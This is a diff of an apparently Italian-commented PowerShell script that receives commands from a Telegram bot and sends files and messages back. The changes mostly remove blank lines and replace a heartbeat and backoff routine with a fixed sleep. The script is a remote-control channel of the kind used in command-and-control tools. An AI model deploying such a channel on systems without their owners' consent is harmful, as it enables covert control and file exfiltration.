@@ -47,8 +47,6 @@ function DownloadFile($file_id, $file_name)
     else { SendMessage "Il file non è stato scaricato" }
 }
 
-
-
 # Funzione per inviare un file tramite l'API di Telegram
 function SendFile($filePath) 
 {
@@ -73,8 +71,6 @@ function SendFile($filePath)
     }
 }
 
-
-
 function SendMessage($output, $cmd)
 {
     if ($cmd = "") {$cmd = "None"}
@@ -97,7 +93,6 @@ function SendMessage($output, $cmd)
         Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
     } catch { Start-Sleep -Seconds 3 }
 }
-
 
 function CheckRequiredParameters($CommandString)
 {
@@ -135,7 +130,6 @@ function CheckRequiredParameters($CommandString)
     } else { return $true }
 }
 
-
 # Funzione per controllare la raggiungibilità del sito
 function TestTelegramAPI {
     try { 
@@ -144,7 +138,6 @@ function TestTelegramAPI {
     } 
     catch { return $false }
 }
-
 
 # Funzione principale per ascoltare i comandi da Telegram
 function CommandListener
@@ -245,17 +238,8 @@ function CommandListener
                     }
                 }
             }
-                        
             # Gestione delle pause tra le webrequest 
-            $timeout = $timeout+100
-            Start-Sleep -Milliseconds $timeout
-            if ($timeout -eq 10000) {
-                # Impegna la CPU per evitare che la sessione di powershell si blocchi
-                for ($i = 0; $i -lt 5; $i++) {(Get-Random) + (Get-Random) / 2 * 20}
-                SendMessage "[Heart Beat]"
-                $timeout = 1000
-            }
-
+            Start-Sleep -Milliseconds 1000
         } catch { Start-Sleep -Seconds 5 }
     }
     # Elimina la sessione di richieste web
